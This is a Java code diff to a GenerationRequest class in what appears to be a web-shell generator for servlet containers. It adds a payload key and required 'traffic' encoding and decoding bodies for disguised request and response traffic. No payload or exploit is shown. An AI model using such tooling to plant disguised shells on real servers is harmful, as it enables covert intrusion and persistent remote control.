@@ -18,8 +18,9 @@ public final class GenerationRequest {
 
     private final boolean requestDisguisePresent;
     private final boolean responseDisguisePresent;
-    private final String requestDecodeBody;
-    private final String responseEncodeBody;
+    private final String requestTrafficDecodeBody;
+    private final String responseTrafficEncodeBody;
+    private final String payloadKey;
     private final String coreClassName;
     private final int responseCode;
     private final TransportProtocol protocol;
@@ -49,12 +50,11 @@ public final class GenerationRequest {
         Disguise responseDisguise = config.getRespDisguise();
         this.requestDisguisePresent = requestDisguise != null;
         this.responseDisguisePresent = responseDisguise != null;
-        this.requestDecodeBody = requestDisguise == null
-                ? null
-                : requestDisguise.getDecodeBody();
-        this.responseEncodeBody = responseDisguise == null
-                ? null
-                : responseDisguise.getEncodeBody();
+        this.requestTrafficDecodeBody = requestDisguise == null
+                ? null : requestDisguise.getTrafficDecodeBody();
+        this.responseTrafficEncodeBody = responseDisguise == null
+                ? null : responseDisguise.getTrafficEncodeBody();
+        this.payloadKey = config.getPayloadKey();
         this.coreClassName = config.getCoreClassName();
         this.responseCode = config.getRespCode();
         this.protocol = TransportProtocol.parse(config.getProtocol());
@@ -97,6 +97,13 @@ public final class GenerationRequest {
         if (!responseDisguisePresent) {
             throw new IllegalArgumentException("respDisguise不能为空");
         }
+        if (payloadKey == null || payloadKey.trim().isEmpty()) {
+            throw new IllegalArgumentException("payloadKey不能为空");
+        }
+        if (requestTrafficDecodeBody == null || requestTrafficDecodeBody.trim().isEmpty()
+                || responseTrafficEncodeBody == null || responseTrafficEncodeBody.trim().isEmpty()) {
+            throw new IllegalArgumentException("请求/响应伪装必须提供 traffic 编解码体");
+        }
         if (servletNamespace.resolve() == ServletNamespace.JAKARTA
                 && !targetJavaVersion.isAuto()
                 && targetJavaVersion.getMajor() < 8) {
@@ -106,17 +113,17 @@ public final class GenerationRequest {
     }
 
     /**
-     * 为执行创建编码策略快照，避免旧 Disguise 对象在生成期间被修改。
+     * 为执行创建 traffic 策略快照，避免生成期间读取可变配置。
      */
     public Disguise createRequestDisguiseSnapshot() {
         Disguise snapshot = new Disguise();
-        snapshot.setDecodeBody(requestDecodeBody);
+        snapshot.setTrafficDecodeBody(requestTrafficDecodeBody);
         return snapshot;
     }
 
     public Disguise createResponseDisguiseSnapshot() {
         Disguise snapshot = new Disguise();
-        snapshot.setEncodeBody(responseEncodeBody);
+        snapshot.setTrafficEncodeBody(responseTrafficEncodeBody);
         return snapshot;
     }
 
@@ -166,6 +173,10 @@ public final class GenerationRequest {
 
     public String getHeaderValue() {
         return headerValue;
+    }
+
+    public String getPayloadKey() {
+        return payloadKey;
     }
 
     public String getRequestedShellClassName() {
